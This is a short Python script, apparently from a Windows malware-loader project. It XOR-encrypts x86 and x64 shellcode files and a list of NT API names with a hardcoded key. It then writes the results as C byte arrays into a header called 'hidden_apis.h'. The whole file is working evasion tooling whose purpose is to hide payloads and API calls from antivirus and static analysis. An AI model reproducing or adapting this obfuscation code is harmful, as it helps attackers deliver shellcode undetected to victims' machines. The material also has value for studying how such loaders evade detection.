ntAPIs_path = 'ntAPIs.txt'
with open(ntAPIs_path, "r") as apis:
    API_NAMES = [line.rstrip() for line in apis]

def xor(data: bytes, key: bytes) -> bytes:
    klen = len(key)
    return bytes(b ^ key[i % klen] for i, b in enumerate(data))

def to_c_array(data: bytes, varname: str, ctype="UCHAR") -> str:
    hex_vals = ", ".join(f"0x{b:02x}" for b in data)
    return f"{ctype} {varname}[] = {{ {hex_vals} }};"

KEY = b"rzdhop_is_a_nice_guy"
with open("./payload/x86Shellcode", "r") as x86Shellcode: 
    SHELLCODE_x86 = bytes.fromhex(x86Shellcode.read())
with open("./payload/x64Shellcode", "r") as x64Shellcode: 
    SHELLCODE_x64 = bytes.fromhex(x64Shellcode.read())

with open("./libs/hidden_apis.h", "w") as payload_f: 
    payload_f.write("#pragma once\n#include <windows.h>\n\n")
    payload_f.write("//============== Obfuscated Vars ================\n")
    payload_f.write("//_____ ntFunctions ____\n")
    for api in API_NAMES:
        enc = xor(api.encode() + b"\x00", KEY)
        c_name = "_" + api
        payload_f.write(to_c_array(enc, c_name) +"\n")
    payload_f.write("//______________________\n\n")

    payload_f.write("//_____ Shellcodes ____\n")
    payload_f.write(to_c_array(xor(SHELLCODE_x86, KEY), "shellcode_x86") +"\n")
    payload_f.write(to_c_array(xor(SHELLCODE_x64, KEY), "shellcode_x64") +"\n")
    payload_f.write("//_____________________\n\n")

    payload_f.write("//_____ Key ____\n")
    payload_f.write(to_c_array(KEY, "key") +"\n")
    payload_f.write("//______________\n")
    payload_f.write("//===============================================\n")

